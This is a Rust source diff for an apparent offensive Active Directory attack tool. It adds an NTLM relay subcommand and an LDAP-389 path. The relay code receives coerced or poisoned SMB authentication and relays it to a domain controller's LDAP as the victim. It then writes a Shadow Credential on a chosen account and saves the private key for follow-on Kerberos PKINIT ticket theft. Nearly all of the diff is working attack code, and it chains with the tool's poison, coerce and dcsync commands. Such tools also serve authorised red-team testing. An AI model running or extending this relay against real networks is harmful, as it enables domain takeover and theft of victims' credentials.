@@ -66,6 +66,24 @@ enum AttackCmd {
     Capture(CaptureArgs),
     /// Poison LLMNR + NBT-NS name resolution to lure victims to us (pair with `capture`).
     Poison(PoisonArgs),
+    /// NTLM relay: SMB victim (coerced/poisoned) → LDAP as the victim → write a Shadow Credential.
+    Relay(RelayArgs),
+}
+
+#[derive(Parser)]
+struct RelayArgs {
+    /// SMB address to receive the coerced/poisoned victim on
+    #[arg(long, default_value = "0.0.0.0:445")]
+    listen: String,
+    /// Target DC to relay the victim's auth to (LDAP :389)
+    #[arg(long)]
+    target_dc: String,
+    /// AD DNS domain, for the base DN (e.g. corp.local)
+    #[arg(long)]
+    realm: String,
+    /// Object (sAMAccountName) to write msDS-KeyCredentialLink on, as the relayed victim
+    #[arg(long)]
+    target_object: String,
 }
 
 #[derive(Parser)]
@@ -163,12 +181,18 @@ struct AbuseArgs {
     /// the key .pem path — defaults to `<target>.key.pem`
     #[arg(long, default_value = "")]
     value: String,
-    /// Kerberos realm (pkinit)
+    /// Kerberos realm (pkinit); also the AD DNS domain for --ldap389 base DN
     #[arg(long)]
     realm: Option<String>,
     /// KDC host[:port] (pkinit)
     #[arg(long)]
     kdc: Option<String>,
+    /// add-keycred over raw LDAP-389 + NTLM SASL bind (no LDAPS) — needs --host + --realm
+    #[arg(long)]
+    ldap389: bool,
+    /// DC host for --ldap389
+    #[arg(long)]
+    host: Option<String>,
 }
 
 #[derive(Parser)]
@@ -267,6 +291,7 @@ async fn main() -> Result<()> {
         Command::Attack(AttackCmd::Dcsync(a)) => dcsync(a).await,
         Command::Attack(AttackCmd::Capture(a)) => adhammer_smb::server::capture(&a.listen).await.map_err(Into::into),
         Command::Attack(AttackCmd::Poison(a)) => poison::poison(a.spoof_ip).await,
+        Command::Attack(AttackCmd::Relay(a)) => relay(a).await,
     }
 }
 
@@ -364,6 +389,25 @@ async fn abuse(a: AbuseArgs) -> Result<()> {
         println!("    reply key derived from DH + AS-REP enc-part decrypted (holder of the registered key)");
         println!("    ticket valid until {}", tgt.end_time);
         println!("    ccache saved to {cc_path}  (export KRB5CCNAME={cc_path})");
+        return Ok(());
+    }
+
+    // add-keycred over raw LDAP-389 + NTLM SASL (no LDAPS) — also the relay code path.
+    if a.ldap389 {
+        let host = a.host.clone().context("--ldap389 needs --host")?;
+        let realm = a.realm.clone().context("--ldap389 needs --realm")?;
+        let user = a.user.clone().context("--ldap389 needs --user")?;
+        let password = a.password.clone().context("--ldap389 needs --password")?;
+        let bare = user.split('@').next().unwrap_or(&user).rsplit('\\').next().unwrap_or(&user).to_string();
+        let base: String = realm.split('.').map(|p| format!("DC={p}")).collect::<Vec<_>>().join(",");
+        let mut ld = adhammer_ldap::LdapClient::connect(&format!("{host}:389")).await?;
+        ld.bind_ntlm(&realm, &bare, &password, "ADHAMMER").await?;
+        let dn = ld.find_dn(&base, &a.target).await?;
+        let kc = adhammer_kerberos::shadowcred::build_key_credential(&dn)?;
+        ld.modify_add(&dn, "msDS-KeyCredentialLink", kc.dn_binary.as_bytes()).await?;
+        std::fs::write(format!("{}.key.pem", a.target), &kc.private_key_pem)?;
+        println!("[+] LDAP-389 (NTLM SASL) add-keycred on {dn}");
+        println!("    key saved to {}.key.pem — Phase 2: attack abuse --action pkinit --target {}", a.target, a.target);
         return Ok(());
     }
 
@@ -494,6 +538,45 @@ const SERVICES: &[(u16, &str)] = &[
 ];
 /// Ports whose services send a text greeting on connect — grab it for version intel.
 const GREETERS: &[u16] = &[21, 22, 25, 110, 143];
+
+/// NTLM relay: receive a coerced/poisoned SMB auth and relay it to a DC's LDAP as the victim,
+/// then write a Shadow Credential on `target_object`. Chain with `attack coerce`/`poison`.
+async fn relay(a: RelayArgs) -> Result<()> {
+    use adhammer_smb::server::RelayConn;
+    let base: String = a.realm.split('.').map(|p| format!("DC={p}")).collect::<Vec<_>>().join(",");
+    let listener = RelayConn::listen(&a.listen).await?;
+    println!("[*] relay listening on {} → LDAP {} (write keycred on {})", a.listen, a.target_dc, a.target_object);
+    println!("    now coerce/poison a victim toward this host (e.g. attack coerce --pipe spoolss --listener <us>)");
+    loop {
+        let (stream, peer) = listener.accept().await?;
+        let (target_dc, base, target_object) = (a.target_dc.clone(), base.clone(), a.target_object.clone());
+        tokio::spawn(async move {
+            if let Err(e) = relay_one(stream, &peer.to_string(), &target_dc, &base, &target_object).await {
+                println!("[-] relay from {peer} failed: {e}");
+            }
+        });
+    }
+}
+
+async fn relay_one(stream: tokio::net::TcpStream, peer: &str, target_dc: &str, base: &str, target_object: &str) -> Result<()> {
+    use adhammer_smb::server::RelayConn;
+    let mut rc = RelayConn::new(stream);
+    let type1 = rc.recv_type1().await?;
+    println!("[+] victim {peer} started NTLM — relaying to {target_dc} LDAP");
+    let mut ld = adhammer_ldap::LdapClient::connect(&format!("{target_dc}:389")).await?;
+    let type2 = ld.sasl_step1(&type1).await?; // target's challenge
+    rc.send_challenge(&type2).await?; // → victim signs the target's challenge
+    let type3 = rc.recv_type3().await?;
+    ld.sasl_step2(&type3).await?; // now authenticated to the DC AS the victim
+    println!("[+] relayed bind to {target_dc} succeeded as the victim");
+    let dn = ld.find_dn(base, target_object).await?;
+    let kc = adhammer_kerberos::shadowcred::build_key_credential(&dn)?;
+    ld.modify_add(&dn, "msDS-KeyCredentialLink", kc.dn_binary.as_bytes()).await?;
+    std::fs::write(format!("{target_object}.key.pem"), &kc.private_key_pem)?;
+    println!("[+] Shadow Credential written on {dn} — key {target_object}.key.pem");
+    println!("    → attack abuse --action pkinit --target {target_object} --realm <realm> --kdc {target_dc}");
+    Ok(())
+}
 
 /// Network sweep: full service scan + banner grab per target, DC detection, and SMB signing
 /// (NTLM-relay) posture — the attack-surface map for the whole estate.
